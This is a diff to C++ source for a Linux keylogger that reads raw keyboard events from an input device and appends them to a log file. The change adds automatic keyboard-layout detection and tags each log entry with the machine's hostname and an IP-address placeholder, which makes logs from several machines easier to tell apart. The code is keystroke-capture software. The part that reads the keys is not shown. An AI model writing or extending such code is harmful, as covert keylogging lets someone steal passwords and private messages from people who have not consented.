@@ -1,6 +1,8 @@
 #include "keylogger.hpp"
 #include "key_mapping.hpp"
 #include "datetime_utils.hpp"
+#include "host_utils.hpp"
+#include "keyboard_layout.hpp"
 #include <fstream>
 #include <iostream>
 #include <fcntl.h>
@@ -8,12 +10,14 @@
 #include <cstring>
 #include <linux/input.h>
 
-bool startKeyLogger(const std::string& devicePath, const std::string& logPath, const std::string& layout) {
+bool startKeyLogger(const std::string& devicePath, const std::string& logPath) {
     int fd = open(devicePath.c_str(), O_RDONLY);
     if (fd == -1) {
         std::cerr << "Cannot open " << devicePath << std::endl;
         return false;
     }
+    
+    std::string layout = getKeyboardLayout();
 
     std::ofstream logfile(logPath, std::ios::app);
     if (!logfile) {
@@ -22,8 +26,9 @@ bool startKeyLogger(const std::string& devicePath, const std::string& logPath, c
         return false;
     }
     else{
+        std::string hostname = host_utils::get_hostname();
         std::string currentDateTime = datetime_utils::get_date();
-        logfile << "\n\nDate: " << currentDateTime << "\n";
+        logfile << "\n\n" << "[" << hostname << "@<ip address>][" << layout << "] " << "Date: " << currentDateTime << "\n";
     }
 
     struct input_event ev;
